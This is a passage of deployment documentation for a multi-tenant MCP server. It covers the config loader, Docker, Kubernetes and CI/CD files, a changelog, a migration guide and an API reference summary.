          origin: env.CORS_ORIGIN?.split(',') || [],
          methods: env.CORS_METHODS?.split(','),
          credentials: env.CORS_CREDENTIALS !== 'false',
          maxAge: parseInt(env.CORS_MAX_AGE || '86400')
        },
        helmet: {
          enabled: env.HELMET_ENABLED !== 'false'
        },
        csrf: {
          enabled: env.CSRF_ENABLED !== 'false',
          secret: env.CSRF_SECRET
        },
        encryption: {
          key: env.ENCRYPTION_KEY,
          algorithm: env.ENCRYPTION_ALGORITHM as any,
          keyRotationDays: parseInt(env.ENCRYPTION_KEY_ROTATION_DAYS || '30')
        }
      },

      external: {
        anaf: {
          apiUrl: env.ANAF_API_URL || 'https://webservicesp.anaf.ro/PlatitorTvaRest/api/v8',
          timeout: parseInt(env.ANAF_TIMEOUT || '10000')
        },
        termene: {
          apiUrl: env.TERMENE_API_URL || 'https://termene.ro/api/v2',
          apiKey: env.TERMENE_API_KEY
        },
        hunter: {
          apiUrl: env.HUNTER_API_URL || 'https://api.hunter.io/v2',
          apiKey: env.HUNTER_API_KEY
        },
        oblio: {
          apiUrl: env.OBLIO_API_URL || 'https://www.oblio.eu/api/v1',
          email: env.OBLIO_EMAIL,
          apiKey: env.OBLIO_API_KEY
        }
      },

      features: {
        aiAgent: env.FEATURE_AI_AGENT !== 'false',
        autoNegotiation: env.FEATURE_AUTO_NEGOTIATION !== 'false',
        documentGeneration: env.FEATURE_DOCUMENT_GENERATION !== 'false',
        efacturaIntegration: env.FEATURE_EFACTURA_INTEGRATION !== 'false',
        whatsappChannel: env.FEATURE_WHATSAPP_CHANNEL !== 'false',
        advancedAnalytics: env.FEATURE_ADVANCED_ANALYTICS === 'true'
      },

      tenantDefaults: {
        tier: env.TENANT_DEFAULT_TIER as any,
        maxSessions: parseInt(env.TENANT_DEFAULT_MAX_SESSIONS || '25'),
        maxTokensPerDay: parseInt(env.TENANT_DEFAULT_MAX_TOKENS_DAY || '100000'),
        maxStorageMb: parseInt(env.TENANT_DEFAULT_MAX_STORAGE_MB || '100'),
        dataRetentionDays: parseInt(env.TENANT_DATA_RETENTION_DAYS || '365')
      },

      healthCheck: {
        interval: parseInt(env.HEALTH_CHECK_INTERVAL || '30000'),
        timeout: parseInt(env.HEALTH_CHECK_TIMEOUT || '5000'),
        retries: parseInt(env.HEALTH_CHECK_RETRIES || '3')
      }
    };
  }

  get<T extends keyof Config>(key: T): Config[T] {
    if (!this.config) {
      throw new Error('Configuration not loaded. Call load() first.');
    }
    return this.config[key];
  }

  getAll(): Config {
    if (!this.config) {
      throw new Error('Configuration not loaded. Call load() first.');
    }
    return this.config;
  }

  isProduction(): boolean {
    return this.get('nodeEnv') === 'production';
  }

  isDevelopment(): boolean {
    return this.get('nodeEnv') === 'development';
  }

  isFeatureEnabled(feature: keyof Config['features']): boolean {
    return this.get('features')[feature];
  }
}

export const configLoader = new ConfigLoader();
export const config = configLoader.load();
```

### 11.4 Docker Configuration

#### 11.4.1 Dockerfile

```dockerfile
# docker/mcp-server/Dockerfile

# ═══════════════════════════════════════════════════════════════════
# Stage 1: Base Image
# ═══════════════════════════════════════════════════════════════════
FROM node:24.12.0-alpine AS base

# Install security updates
RUN apk update && apk upgrade --no-cache

# Add non-root user
RUN addgroup -g 1001 nodejs && \
    adduser -S -u 1001 -G nodejs nodejs

# Install required packages
RUN apk add --no-cache \
    tini \
    curl \
    dumb-init

# ═══════════════════════════════════════════════════════════════════
# Stage 2: Dependencies
# ═══════════════════════════════════════════════════════════════════
FROM base AS deps

WORKDIR /app

# Copy package files
COPY package.json pnpm-lock.yaml ./
COPY packages/mcp-server/package.json ./packages/mcp-server/
COPY packages/shared/package.json ./packages/shared/

# Install dependencies
RUN corepack enable && \
    pnpm install --frozen-lockfile --prod=false

# ═══════════════════════════════════════════════════════════════════
# Stage 3: Builder
# ═══════════════════════════════════════════════════════════════════
FROM deps AS builder

WORKDIR /app

# Copy source code
COPY packages/mcp-server ./packages/mcp-server
COPY packages/shared ./packages/shared
COPY tsconfig.json ./

# Build
RUN pnpm --filter @cerniq/mcp-server build

# Prune dev dependencies
RUN pnpm prune --prod

# ═══════════════════════════════════════════════════════════════════
# Stage 4: Production
# ═══════════════════════════════════════════════════════════════════
FROM base AS production

WORKDIR /app

# Set environment
ENV NODE_ENV=production
ENV MCP_HOST=0.0.0.0
ENV MCP_PORT=3000

# Copy built application
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/packages/mcp-server/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/packages/mcp-server/package.json ./
COPY --from=builder --chown=nodejs:nodejs /app/packages/shared/dist ./packages/shared/dist

# Copy config files
COPY --chown=nodejs:nodejs docker/mcp-server/config ./config

# Create directories
RUN mkdir -p /app/logs /app/tmp && \
    chown -R nodejs:nodejs /app

# Switch to non-root user
USER nodejs

# Health check
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD curl -f http://localhost:${MCP_PORT}/health || exit 1

# Expose port
EXPOSE ${MCP_PORT}

# Use tini as init
ENTRYPOINT ["/sbin/tini", "--"]

# Start application
CMD ["node", "dist/server.js"]
```

#### 11.4.2 Docker Compose

```yaml
# docker/docker-compose.mcp.yaml

version: '3.9'

services:
  # ═══════════════════════════════════════════════════════════════════
  # MCP Server
  # ═══════════════════════════════════════════════════════════════════
  mcp-server:
    build:
      context: ../..
      dockerfile: docker/mcp-server/Dockerfile
    image: cerniq/mcp-server:${VERSION:-latest}
    container_name: cerniq-mcp-server
    restart: unless-stopped
    
    environment:
      - NODE_ENV=${NODE_ENV:-production}
      - MCP_PORT=3000
      - DATABASE_URL=postgresql://cerniq_user:${DB_PASSWORD}@postgres:5432/cerniq_db
      - REDIS_URL=redis://redis:6379
    
    secrets:
      - db_password
      - redis_password
      - jwt_secret
      - session_secret
      - anthropic_api_key
      - encryption_key
    
    ports:
      - "3000:3000"
      - "9090:9090"  # Metrics
    
    networks:
      - cerniq-internal
      - cerniq-external
    
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 30s
    
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 2G
        reservations:
          cpus: '0.5'
          memory: 512M
    
    logging:
      driver: "json-file"
      options:
        max-size: "100m"
        max-file: "5"
    
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.mcp.rule=Host(`api.cerniq.app`) && PathPrefix(`/api/mcp`)"
      - "traefik.http.routers.mcp.tls=true"
      - "traefik.http.routers.mcp.tls.certresolver=letsencrypt"
      - "traefik.http.services.mcp.loadbalancer.server.port=3000"
      - "traefik.http.routers.mcp.middlewares=mcp-ratelimit,mcp-headers"
      - "traefik.http.middlewares.mcp-ratelimit.ratelimit.average=100"
      - "traefik.http.middlewares.mcp-ratelimit.ratelimit.burst=50"
      - "traefik.http.middlewares.mcp-headers.headers.customresponseheaders.X-Frame-Options=DENY"

  # ═══════════════════════════════════════════════════════════════════
  # MCP Worker (Tool Execution)
  # ═══════════════════════════════════════════════════════════════════
  mcp-worker:
    build:
      context: ../..
      dockerfile: docker/mcp-server/Dockerfile
    image: cerniq/mcp-server:${VERSION:-latest}
    container_name: cerniq-mcp-worker
    restart: unless-stopped
    command: ["node", "dist/worker.js"]
    
    environment:
      - NODE_ENV=${NODE_ENV:-production}
      - WORKER_MODE=true
      - WORKER_CONCURRENCY=5
      - DATABASE_URL=postgresql://cerniq_user:${DB_PASSWORD}@postgres:5432/cerniq_db
      - REDIS_URL=redis://redis:6379
    
    secrets:
      - db_password
      - redis_password
      - anthropic_api_key
    
    networks:
      - cerniq-internal
    
    depends_on:
      - mcp-server
      - redis
    
    deploy:
      mode: replicated
      replicas: 2
      resources:
        limits:
          cpus: '1.0'
          memory: 1G

  # ═══════════════════════════════════════════════════════════════════
  # PostgreSQL
  # ═══════════════════════════════════════════════════════════════════
  postgres:
    image: postgres:18.1-alpine
    container_name: cerniq-postgres
    restart: unless-stopped
    
    environment:
      - POSTGRES_DB=cerniq_db
      - POSTGRES_USER=cerniq_user
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    
    secrets:
      - db_password
    
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./init-scripts:/docker-entrypoint-initdb.d:ro
    
    networks:
      - cerniq-internal
    
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U cerniq_user -d cerniq_db"]
      interval: 10s
      timeout: 5s
      retries: 5
    
    deploy:
      resources:
        limits:
          cpus: '4.0'
          memory: 8G

  # ═══════════════════════════════════════════════════════════════════
  # Redis
  # ═══════════════════════════════════════════════════════════════════
  redis:
    image: redis:8.4-alpine
    container_name: cerniq-redis
    restart: unless-stopped
    command: >
      redis-server
      --appendonly yes
      --maxmemory 2gb
      --maxmemory-policy allkeys-lru
      --requirepass_file /run/secrets/redis_password
    
    secrets:
      - redis_password
    
    volumes:
      - redis_data:/data
    
    networks:
      - cerniq-internal
    
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
    
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 2G

networks:
  cerniq-internal:
    driver: bridge
    internal: true
  cerniq-external:
    driver: bridge

volumes:
  postgres_data:
  redis_data:

secrets:
  db_password:
    file: ./secrets/db_password.txt
  redis_password:
    file: ./secrets/redis_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt
  session_secret:
    file: ./secrets/session_secret.txt
  anthropic_api_key:
    file: ./secrets/anthropic_api_key.txt
  encryption_key:
    file: ./secrets/encryption_key.txt
```

### 11.5 Kubernetes Deployment

```yaml
# k8s/mcp-server/deployment.yaml

apiVersion: apps/v1
kind: Deployment
metadata:
  name: mcp-server
  namespace: cerniq
  labels:
    app: mcp-server
    component: api
    tier: backend
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 1
  selector:
    matchLabels:
      app: mcp-server
  template:
    metadata:
      labels:
        app: mcp-server
        component: api
        tier: backend
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "9090"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: mcp-server
      
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
      
      containers:
        - name: mcp-server
          image: cerniq/mcp-server:latest
          imagePullPolicy: Always
          
          ports:
            - name: http
              containerPort: 3000
              protocol: TCP
            - name: metrics
              containerPort: 9090
              protocol: TCP
          
          env:
            - name: NODE_ENV
              value: "production"
            - name: MCP_PORT
              value: "3000"
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: mcp-secrets
                  key: database-url
            - name: REDIS_URL
              valueFrom:
                secretKeyRef:
                  name: mcp-secrets
                  key: redis-url
            - name: JWT_SECRET
              valueFrom:
                secretKeyRef:
                  name: mcp-secrets
                  key: jwt-secret
            - name: ANTHROPIC_API_KEY
              valueFrom:
                secretKeyRef:
                  name: mcp-secrets
                  key: anthropic-api-key
          
          resources:
            requests:
              cpu: "250m"
              memory: "512Mi"
            limits:
              cpu: "2000m"
              memory: "2Gi"
          
          livenessProbe:
            httpGet:
              path: /health/liveness
              port: http
            initialDelaySeconds: 30
            periodSeconds: 10
            timeoutSeconds: 5
            failureThreshold: 3
          
          readinessProbe:
            httpGet:
              path: /health/readiness
              port: http
            initialDelaySeconds: 10
            periodSeconds: 5
            timeoutSeconds: 3
            failureThreshold: 3
          
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          
          volumeMounts:
            - name: tmp
              mountPath: /tmp
            - name: config
              mountPath: /app/config
              readOnly: true
      
      volumes:
        - name: tmp
          emptyDir: {}
        - name: config
          configMap:
            name: mcp-config
      
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
            - weight: 100
              podAffinityTerm:
                labelSelector:
                  matchLabels:
                    app: mcp-server
                topologyKey: kubernetes.io/hostname
      
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: ScheduleAnyway
          labelSelector:
            matchLabels:
              app: mcp-server

---
apiVersion: v1
kind: Service
metadata:
  name: mcp-server
  namespace: cerniq
  labels:
    app: mcp-server
spec:
  type: ClusterIP
  ports:
    - name: http
      port: 3000
      targetPort: http
      protocol: TCP
    - name: metrics
      port: 9090
      targetPort: metrics
      protocol: TCP
  selector:
    app: mcp-server

---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: mcp-server
  namespace: cerniq
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: mcp-server
  minReplicas: 3
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
    - type: Pods
      pods:
        metric:
          name: http_requests_per_second
        target:
          type: AverageValue
          averageValue: "100"
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
        - type: Percent
          value: 10
          periodSeconds: 60
    scaleUp:
      stabilizationWindowSeconds: 0
      policies:
        - type: Percent
          value: 100
          periodSeconds: 15
        - type: Pods
          value: 4
          periodSeconds: 15
      selectPolicy: Max

---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: mcp-server
  namespace: cerniq
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app: mcp-server

---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: mcp-server
  namespace: cerniq
  annotations:
    kubernetes.io/ingress.class: nginx
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/proxy-body-size: "10m"
    nginx.ingress.kubernetes.io/proxy-read-timeout: "60"
    nginx.ingress.kubernetes.io/rate-limit: "100"
    nginx.ingress.kubernetes.io/rate-limit-window: "1m"
spec:
  tls:
    - hosts:
        - api.cerniq.app
      secretName: cerniq-tls
  rules:
    - host: api.cerniq.app
      http:
        paths:
          - path: /api/mcp
            pathType: Prefix
            backend:
              service:
                name: mcp-server
                port:
                  name: http
```

### 11.6 CI/CD Pipeline

```yaml
# .github/workflows/mcp-server.yaml

name: MCP Server CI/CD

on:
  push:
    branches: [main, develop]
    paths:
      - 'packages/mcp-server/**'
      - 'packages/shared/**'
      - '.github/workflows/mcp-server.yaml'
  pull_request:
    branches: [main, develop]
    paths:
      - 'packages/mcp-server/**'
      - 'packages/shared/**'

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: cerniq/mcp-server
  NODE_VERSION: '24.12.0'

jobs:
  # ═══════════════════════════════════════════════════════════════════
  # Lint & Type Check
  # ═══════════════════════════════════════════════════════════════════
  lint:
    name: Lint & Type Check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 9
      
      - name: Get pnpm store directory
        id: pnpm-cache
        shell: bash
        run: echo "STORE_PATH=$(pnpm store path)" >> $GITHUB_OUTPUT
      
      - name: Setup pnpm cache
        uses: actions/cache@v4
        with:
          path: ${{ steps.pnpm-cache.outputs.STORE_PATH }}
          key: ${{ runner.os }}-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
          restore-keys: |
            ${{ runner.os }}-pnpm-store-
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run linter
        run: pnpm --filter @cerniq/mcp-server lint
      
      - name: Type check
        run: pnpm --filter @cerniq/mcp-server typecheck

  # ═══════════════════════════════════════════════════════════════════
  # Unit Tests
  # ═══════════════════════════════════════════════════════════════════
  unit-tests:
    name: Unit Tests
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 9
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run unit tests
        run: pnpm --filter @cerniq/mcp-server test:unit -- --coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          files: packages/mcp-server/coverage/lcov.info
          flags: mcp-server-unit

  # ═══════════════════════════════════════════════════════════════════
  # Integration Tests
  # ═══════════════════════════════════════════════════════════════════
  integration-tests:
    name: Integration Tests
    runs-on: ubuntu-latest
    needs: lint
    services:
      postgres:
        image: postgres:18.1
        env:
          POSTGRES_DB: test_db
          POSTGRES_USER: test_user
          POSTGRES_PASSWORD: test_password
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432
      
      redis:
        image: redis:8.4-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 9
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run migrations
        run: pnpm --filter @cerniq/mcp-server db:migrate
        env:
          DATABASE_URL: postgresql://test_user:test_password@localhost:5432/test_db
      
      - name: Run integration tests
        run: pnpm --filter @cerniq/mcp-server test:integration
        env:
          DATABASE_URL: postgresql://test_user:test_password@localhost:5432/test_db
          REDIS_URL: redis://localhost:6379

  # ═══════════════════════════════════════════════════════════════════
  # Security Scan
  # ═══════════════════════════════════════════════════════════════════
  security-scan:
    name: Security Scan
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 9
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run npm audit
        run: pnpm audit --audit-level=high
      
      - name: Run Snyk scan
        uses: snyk/actions/node@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: Run SAST scan
        uses: github/codeql-action/analyze@v3
        with:
          languages: typescript

  # ═══════════════════════════════════════════════════════════════════
  # Build Docker Image
  # ═══════════════════════════════════════════════════════════════════
  build:
    name: Build Docker Image
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, security-scan]
    if: github.event_name == 'push'
    permissions:
      contents: read
      packages: write
    outputs:
      image: ${{ steps.meta.outputs.tags }}
      digest: ${{ steps.build.outputs.digest }}
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      
      - name: Login to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=sha,prefix=
            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
      
      - name: Build and push
        id: build
        uses: docker/build-push-action@v5
        with:
          context: .
          file: docker/mcp-server/Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          platforms: linux/amd64,linux/arm64

  # ═══════════════════════════════════════════════════════════════════
  # Deploy to Staging
  # ═══════════════════════════════════════════════════════════════════
  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/develop'
    environment:
      name: staging
      url: https://staging-api.cerniq.app
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup kubectl
        uses: azure/setup-kubectl@v3
      
      - name: Configure kubectl
        run: |
          echo "${{ secrets.KUBE_CONFIG_STAGING }}" | base64 -d > kubeconfig
          echo "KUBECONFIG=$(pwd)/kubeconfig" >> $GITHUB_ENV
      
      - name: Deploy to staging
        run: |
          kubectl set image deployment/mcp-server \
            mcp-server=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.digest }} \
            -n cerniq-staging
          kubectl rollout status deployment/mcp-server -n cerniq-staging --timeout=300s
      
      - name: Run smoke tests
        run: |
          curl -f https://staging-api.cerniq.app/api/mcp/health || exit 1

  # ═══════════════════════════════════════════════════════════════════
  # Deploy to Production
  # ═══════════════════════════════════════════════════════════════════
  deploy-production:
    name: Deploy to Production
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    environment:
      name: production
      url: https://api.cerniq.app
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup kubectl
        uses: azure/setup-kubectl@v3
      
      - name: Configure kubectl
        run: |
          echo "${{ secrets.KUBE_CONFIG_PRODUCTION }}" | base64 -d > kubeconfig
          echo "KUBECONFIG=$(pwd)/kubeconfig" >> $GITHUB_ENV
      
      - name: Deploy canary
        run: |
          kubectl set image deployment/mcp-server-canary \
            mcp-server=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.digest }} \
            -n cerniq
          kubectl rollout status deployment/mcp-server-canary -n cerniq --timeout=300s
      
      - name: Wait for canary validation
        run: sleep 300
      
      - name: Check canary health
        run: |
          ERROR_RATE=$(kubectl exec -n cerniq deploy/prometheus -- \
            promql 'rate(http_requests_total{deployment="mcp-server-canary",status=~"5.."}[5m]) / rate(http_requests_total{deployment="mcp-server-canary"}[5m]) * 100')
          if (( $(echo "$ERROR_RATE > 1" | bc -l) )); then
            echo "Canary error rate too high: $ERROR_RATE%"
            kubectl rollout undo deployment/mcp-server-canary -n cerniq
            exit 1
          fi
      
      - name: Deploy to production
        run: |
          kubectl set image deployment/mcp-server \
            mcp-server=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.build.outputs.digest }} \
            -n cerniq
          kubectl rollout status deployment/mcp-server -n cerniq --timeout=600s
      
      - name: Notify deployment
        uses: slackapi/slack-github-action@v1
        with:
          channel-id: 'deployments'
          payload: |
            {
              "text": "MCP Server deployed to production",
              "attachments": [
                {
                  "color": "good",
                  "fields": [
                    {"title": "Version", "value": "${{ github.sha }}", "short": true},
                    {"title": "Actor", "value": "${{ github.actor }}", "short": true}
                  ]
                }
              ]
            }
        env:
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
```

---

## 12. Changelog & References

### 12.1 Version History

```markdown
# MCP Server Changelog

All notable changes to the MCP Server component are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- Initial MCP Server implementation
- Workers L1 (Resource Loader), L2 (Tool Registry), L3 (Session Manager)
- Full MCP Protocol 2024-11-05 support
- Integration with Anthropic Claude API
- Multi-tenant isolation
- Comprehensive security layer
- OpenTelemetry tracing
- Prometheus metrics
- Structured logging with Pino

## [1.0.0] - 2026-01-XX

### Added
- **Core MCP Implementation**
  - MCP Protocol handler with JSON-RPC 2.0 support
  - Tool registration and execution framework
  - Resource loading with caching
  - Prompt template management
  - Sampling request handling
  
- **Worker L1: Resource Loader**
  - Dynamic resource discovery
  - URI-based resource resolution
  - Resource caching with TTL
  - Batch loading support
  - Content streaming for large resources
  
- **Worker L2: Tool Registry**
  - Tool registration with JSON Schema validation
  - Permission-based tool access control
  - Asynchronous tool execution
  - Tool result caching
  - Error handling with retry logic
  
- **Worker L3: Session Manager**
  - Session lifecycle management
  - Multi-session support per user
  - Session state persistence
  - Automatic session cleanup
  - Session transfer/handover
  
- **Security Features**
  - JWT-based authentication
  - RBAC authorization
  - Tenant isolation
  - Field-level encryption
  - Audit logging with hash chain
  - Rate limiting per endpoint/tenant
  
- **Observability**
  - Structured logging (Pino)
  - Distributed tracing (OpenTelemetry)
  - Metrics collection (Prometheus)
  - Health checks (liveness/readiness)
  
- **Testing**
  - Unit test suite (Vitest)
  - Integration tests with Testcontainers
  - Load testing (Artillery)
  - Security testing (OWASP Top 10)
  - E2E conversation flow tests

### Security
- Implemented OWASP Top 10 protections
- Added SQL injection prevention
- Added XSS sanitization
- Implemented CSRF protection
- Added rate limiting

### Performance
- Implemented multi-layer caching (memory, Redis)
- Added token optimization for LLM calls
- Implemented resource preloading
- Added connection pooling

## [0.9.0] - 2026-01-XX (Beta)

### Added
- Beta release for testing
- Basic MCP protocol support
- Single tenant mode
- Initial tool implementations

### Known Issues
- Memory leak in long-running sessions (fixed in 1.0.0)
- Rate limiter not respecting tenant quotas (fixed in 1.0.0)
```

### 12.2 Migration Guides

#### 12.2.1 Migrating from v0.9 to v1.0

```typescript
// Migration Guide: v0.9.x → v1.0.0

/**
 * BREAKING CHANGES
 * ================
 * 
 * 1. Session API Changes
 *    - createSession() now requires tenantId
 *    - Session tokens include tenant context
 * 
 * 2. Tool Registration Changes
 *    - Tools must specify requiredPermissions
 *    - Tool schemas must include $schema property
 * 
 * 3. Configuration Changes
 *    - Environment variables renamed (see mapping below)
 *    - New required security configuration
 * 
 * 4. Database Schema Changes
 *    - New tenant_id column in sessions table
 *    - New audit_logs table
 *    - Updated indexes for multi-tenant queries
 */

// Environment Variable Mapping
const ENV_MIGRATION = {
  // Old name → New name
  'MCP_SECRET': 'JWT_SECRET',
  'MCP_DB_URL': 'DATABASE_URL',
  'MCP_REDIS': 'REDIS_URL',
  'CLAUDE_KEY': 'ANTHROPIC_API_KEY',
  'MCP_LOG': 'LOG_LEVEL'
};

// Session API Migration
// Before (v0.9):
const session = await mcpClient.createSession({
  userId: 'user-123'
});

// After (v1.0):
const session = await mcpClient.createSession({
  userId: 'user-123',
  tenantId: 'tenant-456'  // Required in v1.0
});

// Tool Registration Migration
// Before (v0.9):
mcpServer.registerTool({
  name: 'search_products',
  description: 'Search products',
  inputSchema: { /* ... */ },
  handler: async (args) => { /* ... */ }
});

// After (v1.0):
mcpServer.registerTool({
  name: 'search_products',
  description: 'Search products',
  inputSchema: {
    $schema: 'http://json-schema.org/draft-07/schema#',  // Required
    type: 'object',
    properties: { /* ... */ }
  },
  requiredPermissions: ['products:read'],  // Required
  handler: async (args, context) => { /* ... */ }  // context added
});

// Database Migration Script
const MIGRATION_SQL = `
-- Add tenant_id to sessions
ALTER TABLE sessions ADD COLUMN tenant_id VARCHAR(255);
UPDATE sessions SET tenant_id = 'default' WHERE tenant_id IS NULL;
ALTER TABLE sessions ALTER COLUMN tenant_id SET NOT NULL;

-- Add index for tenant queries
CREATE INDEX idx_sessions_tenant ON sessions(tenant_id);

-- Create audit_logs table
CREATE TABLE audit_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id VARCHAR(255) NOT NULL,
  timestamp TIMESTAMPTZ DEFAULT NOW(),
  category VARCHAR(50) NOT NULL,
  action VARCHAR(100) NOT NULL,
  severity VARCHAR(20) NOT NULL,
  actor_id VARCHAR(255),
  target_type VARCHAR(50),
  target_id VARCHAR(255),
  details JSONB,
  hash VARCHAR(64),
  previous_hash VARCHAR(64)
);

CREATE INDEX idx_audit_tenant ON audit_logs(tenant_id);
CREATE INDEX idx_audit_timestamp ON audit_logs(timestamp);
`;
```

### 12.3 API Reference Summary

```yaml
# MCP Server API Reference Summary

base_url: /api/mcp
version: 1.0.0
protocol: MCP 2024-11-05

# ───────────────────────────────────────────────────────────────────
# Session Endpoints
# ───────────────────────────────────────────────────────────────────
sessions:
  create:
    method: POST
    path: /sessions
    auth: required
    body:
      userId: string (required)
      tenantId: string (required)
      metadata: object (optional)
    response: { id, token, expiresAt }
  
  get:
    method: GET
    path: /sessions/{sessionId}
    auth: required
    response: { session details }
  
  delete:
    method: DELETE
    path: /sessions/{sessionId}
    auth: required
    response: { success: true }

# ───────────────────────────────────────────────────────────────────
# Conversation Endpoints
# ───────────────────────────────────────────────────────────────────
conversations:
  create:
    method: POST
    path: /conversations
    auth: required
    body:
      sessionId: string (required)
      customerId: string (required)
      channel: string (required)
      context: object (optional)
    response: { id, status, createdAt }
  
  get:
    method: GET
    path: /conversations/{conversationId}
    auth: required
    response: { conversation details }
  
  list:
    method: GET
    path: /conversations
    auth: required
    query: { status, channel, limit, offset }
    response: { data: [], total, limit, offset }
  
  update:
    method: PATCH
    path: /conversations/{conversationId}
    auth: required
    body: { status, context }
    response: { updated conversation }

# ───────────────────────────────────────────────────────────────────
# Message Endpoints
# ───────────────────────────────────────────────────────────────────
messages:
  send:
    method: POST
    path: /conversations/{conversationId}/messages
    auth: required
    body:
      role: 'user' | 'assistant' | 'system'
      content: string
      metadata: object (optional)
    response: { messageId, createdAt }
  
  generate:
    method: POST
    path: /conversations/{conversationId}/generate
    auth: required
    body:
      systemPrompt: string (optional)
      tools: string[] (optional)
      maxTokens: number (optional)
    response: { message, toolsUsed, analysis }
  
  list:
    method: GET
    path: /conversations/{conversationId}/messages
    auth: required
    query: { limit, before, after }
    response: { data: [], hasMore }

# ───────────────────────────────────────────────────────────────────
# Tool Endpoints
# ───────────────────────────────────────────────────────────────────
tools:
  list:
    method: GET
    path: /tools
    auth: required
    response: { tools: [] }
  
  execute:
    method: POST
    path: /tools/execute
